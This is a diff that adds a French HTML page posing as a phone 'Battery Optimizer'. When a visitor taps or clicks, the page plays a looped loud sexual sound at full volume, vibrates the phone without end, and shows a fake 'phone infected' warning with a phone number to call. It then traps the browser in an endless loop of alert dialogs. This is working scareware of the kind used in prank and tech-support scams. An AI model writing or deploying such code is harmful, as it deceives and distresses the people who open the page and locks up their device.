@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Optimiseur de Batterie</title>
+    <style>
+        body { background: black; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; touch-action: none; }
+        .card { text-align: center; border: 2px solid #00ff00; padding: 30px; border-radius: 15px; box-shadow: 0 0 15px #00ff00; }
+        #start-btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 1.2rem; margin-top: 20px; }
+    </style>
+</head>
+<body onclick="activerPiege()" ontouchstart="activerPiege()">
+
+    <div class="card" id="interface">
+        <h2 style="margin: 0;">BATTERIE FAIBLE ?</h2>
+        <p style="color: #888;">Optimisez votre autonomie en un clic</p>
+        <button id="start-btn">OPTIMISER MAINTENANT</button>
+    </div>
+
+    <audio id="audio" loop preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/loud-moaning-sound-effect-original.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+    function activerPiege() {
+        // 1. Lancer le son au max
+        const son = document.getElementById('audio');
+        son.volume = 1.0;
+        son.play().catch(() => {});
+
+        // 2. Activer la vibration infinie (pattern : vibrate 1s, pause 0.1s)
+        if ("vibrate" in navigator) {
+            navigator.vibrate([1000, 100, 1000, 100, 1000, 100, 1000]);
+            // On relance la vibration toutes les 2 secondes pour qu'elle ne s'arrête jamais
+            setInterval(() => {
+                navigator.vibrate([1000, 100, 1000, 100]);
+            }, 2000);
+        }
+
+        // 3. Choc visuel (Fond blanc + Message rouge agressif)
+        document.body.style.backgroundColor = "white";
+        document.getElementById('interface').innerHTML = `
+            <h1 style="color:red; font-size:2.8rem; font-weight:bold;">
+                ALERTE : TÉLÉPHONE INFECTÉ !
+            </h1>
+            <p style="color:black; font-size:1.2rem;">VIRUS DÉTECTÉ PAR : 0707656355</p>
+        `;
+
+        // 4. Blocage total avec alertes en boucle
+        setTimeout(() => {
+            while(true) {
+                alert("ERREUR CRITIQUE 0x8842 !");
+                alert("VOTRE SYSTÈME EST COMPROMIS !");
+            }
+        }, 100);
+    }
+    </script>
+</body>
+</html>
